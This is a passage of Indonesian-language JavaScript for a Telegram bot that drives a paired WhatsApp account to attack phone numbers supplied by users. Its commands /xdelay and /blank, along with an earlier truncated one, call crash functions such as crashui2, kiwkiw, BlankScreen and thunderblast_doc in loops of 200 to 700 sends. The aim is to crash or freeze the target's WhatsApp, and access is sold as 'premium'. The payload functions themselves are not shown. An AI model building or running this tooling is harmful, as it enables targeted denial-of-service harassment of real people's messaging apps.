    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  // Jalankan progres bertahap
  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `
\`\`\`
▢ Target: ${q}
▢ Status: Successfully.
${stage.text}
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  /// Eksekusi bug setelah progres selesai
  console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 200; i++) {
  await crashui2(target, ptcp = false);
  await Crashui(target);
  await f10(target, Ptcp = false);
    console.log(chalk.red.bold(`Sukses Kirim ioscrash Sebanyak ${i + 1}/200 Ke ${target}`));
    await new Promise((r) => setTimeout(r, 1000));
}
  // Update ke sukses + tombol cek target
  await ctx.editMessageCaption(
    `
\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\`
`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝙲𝙴𝙺 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
///////==== CASE BUG 6 ===\\\\\\\
bot.command("xdelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Coman bug salah contoh coman: /rinegansystem 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`ᴛɪᴍᴇ ᴡᴀᴋᴛᴜ ᴀᴋᴛɪғ\n ᴛᴜɴɢɢᴜ ${remainingTime} ᴅᴇᴛɪᴋ ʟᴀɢɪ`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
const sentMessage = await ctx.replyWithPhoto(getRandomPhoto(), {
      caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sendding bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`,
      parse_mode: "Markdown",
    }
  );

  // Progress bar bertahap
  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  // Jalankan progres bertahap
  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `
\`\`\`
▢ Target: ${q}
▢ Status: Successfully.
${stage.text}
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  /// Eksekusi bug setelah progres selesai
  console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 700; i++) {
  await kiwkiw(target);
  await kiwkiw(target);
    console.log(chalk.red.bold(`Sukses Kirim xdelay Sebanyak ${i + 1}/200 Ke ${target}`));
    await new Promise((r) => setTimeout(r, 1000));
}
  // Update ke sukses + tombol cek target
  await ctx.editMessageCaption(
    `
\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\`
`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝙲𝙴𝙺 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
///////==== CASE BUG 7 ===\\\\\\\
bot.command("blank", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1]; // [5] seharusnya [1] karena /fcinvis 628xxx
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Command salah!\nContoh penggunaan: /forceclose 628xxxx`);
  }

  if (!isOwner(userId) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`⏳ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan awal dan simpan messageId-nya
const sentMessage = await ctx.replyWithPhoto(getRandomPhoto(), {
      caption: `\`\`\`
▢ Target: ${q}
▢ Status: Mengirim bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  // Progress bar bertahap
  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░] 10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░] 30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░] 50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░] 70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░] 90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████] 100%\n✅ Sukses mengirim bug!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`
▢ Target: ${q}
▢ Status: Proses...
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  // Jalankan fungsi pengirim bug
  console.log("\x1b[32m[MENGIRIM BUG]\x1b[0m Menunggu hingga selesai...");

  if (!isOwner(userId)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 400; i++) {
    await thunderblast_notif(target);
    await BlankScreen(target, Ptcp = false);
    await thunderblast_doc(target);
    console.log(chalk.red.bold(`Sukses mengirim blank ${i + 1}/400 ke ${target}`));
    await new Promise((r) => setTimeout(r, 1000)); // Delay 1 detik
  }

  // Update caption final + tombol cek target
  await ctx.editMessageCaption(
    `\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████] 100%
\`\`\``,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ CEK TARGET", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});
///////==== COMMAND OWNER ====\\\\\\\\\
bot.command("setjeda", checkOwner, async (ctx) => {
  const match = ctx.message.text.split(" ");
  const duration = match[1] ? match[1].trim() : null;


  if (!duration) {
    return ctx.reply(`example /setjeda 60s`);
  }

  const seconds = parseCooldownDuration(duration);

  if (seconds === null) {
    return ctx.reply(
      `/setjeda <durasi>\nContoh: /setcd 60s atau /setcd 10m\n(s=detik, m=menit)`
    );
  }

  const cooldownData = loadCooldownData();
  cooldownData.defaultCooldown = seconds;
  saveCooldownData(cooldownData);

  const displayTime =
    seconds >= 60 ? `${Math.floor(seconds / 60)} menit` : `${seconds} detik`;

  await ctx.reply(`Cooldown global diatur ke ${displayTime}`);
});
///=== comand add admin ===\\\
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 7629492264"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status Admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses Admin!`);
});
bot.command("addprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ ᴍᴀsᴜᴋɪɴ ɪᴅ ᴘᴇɴɢɢᴜɴᴀ !!\nᴄᴏɴᴛᴏʜ ᴀᴅᴅ ɴʏᴀ: /addprem 7629492264"
    );
  }

  const userId = args[1];

  if (premiumUsers.includes(userId)) {
    return ctx.reply(
      `✅ Sekarang anda  ${userId} Sudah memiliki akses premium.`
    );
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(
    `✅ Skarang anda ${userId} Sudah memiliki akses premium.`
  );
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 7629492264"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");


  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 7629492264"
    );
  }

  const userId = args[1];

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Anda ${userId} Bukan lagi pengguna premiun⛔.`);
});

//fungsi imglink
const imgLinks = [];

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();



  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("connect", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return await ctx.reply(
      "❌ Exampel Coman Yang benar: /connect 628xxx"
    );
  }

  let phoneNumber = args[1].replace(/[^0-9]/g, "");

  if (client && client.user) {
    return await ctx.reply("Santai Masih Aman!! Lanjut aja boss ku⚡.");
  }

  let sentMessage;

  try {
    // LANGKAH 1: Kirim pesan awal
sentMessage = await ctx.replyWithPhoto(getRandomPhoto(), {
  caption: `
\`\`\`𝐆𝐫𝐞𝐯𝐨𝐮𝐫𝐬 𝐓𝐫𝐚𝐬𝐡
▢ Menyiapkan kode pairing...
╰➤ Nomor : ${phoneNumber}
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]],
      },
    });

    // LANGKAH 2: Ambil kode pairing
    const code = await client.requestPairingCode(phoneNumber, "AXCALDEV"); // CUSTOM PAIR DISINI MINIM 8 HURUF
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      sentMessage.message_id,
      null,
      `
\`\`\`𝐆𝐫𝐞𝐯𝐨𝐮𝐫𝐬 𝐓𝐫𝐚𝐬𝐡
▢ Kode Pairing Anda...
╰➤ Nomor : ${phoneNumber}\`\`\`
╰➤ Kode  : ${formattedCode}
`,
      { parse_mode: "Markdown" }
    );

    // LANGKAH 3: Tunggu koneksi WhatsApp
    let isConnected = true;

client.ev.on("connection.update", async (update) => {
  const { connection, lastDisconnect } = update;

  if (connection === "open" && !isConnected) {
    isConnected = true;
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      sentMessage.message_id,
      null,
      `
\`\`\`𝐆𝐫𝐞𝐯𝐨𝐮𝐫𝐬 𝐓𝐫𝐚𝐬𝐡
▢ Update pairing anda..
╰➤ Nomor : ${phoneNumber}
╰➤ Status : Successfully
\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  if (connection === "close" && !isConnected) {
    const shouldReconnect =
      lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

    if (!shouldReconnect) {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        sentMessage.message_id,
        null,
        `
\`\`\`𝐆𝐫𝐞𝐯𝐨𝐮𝐫𝐬 𝐓𝐫𝐚𝐬𝐡
▢ Update pairing anda...
╰➤ Nomor : ${phoneNumber}
╰➤ Status : Gagal tersambung
\`\`\``,
        { parse_mode: "Markdown" }
      );
    }
  }
});


  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});

// Handler tombol close
bot.action("close", async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesi", checkOwner, async (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("♻️Session berhasil dihapus, Segera lakukan restart pada panel anda sebelum pairing kembali");
  } else {
    ctx.reply("Tidak ada session yang tersimpan saat ini.");
  }
});

//Command Restart
bot.command("restart", checkOwner, async (ctx) => {
  await ctx.reply("Restarting...");
  setTimeout(() => {
    process.exit(0);
  }, 1000); // restart setelah 1 detik
});

/////===== FUNC ANDA =====\\\\\

/////////[ FINAL FUNCT ]\\\\\\\\\\
(async () => {
  console.clear();
  console.log("⚡ Memulai sesi WhatsApp...");
  startSesi();

  console.log("Sukses connected");
  bot.launch();

  // Membersihkan konsol sebelum menampilkan pesan sukses
  console.clear();
  console.log(
    chalk.bold.white(`\n

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`)
  );
})();

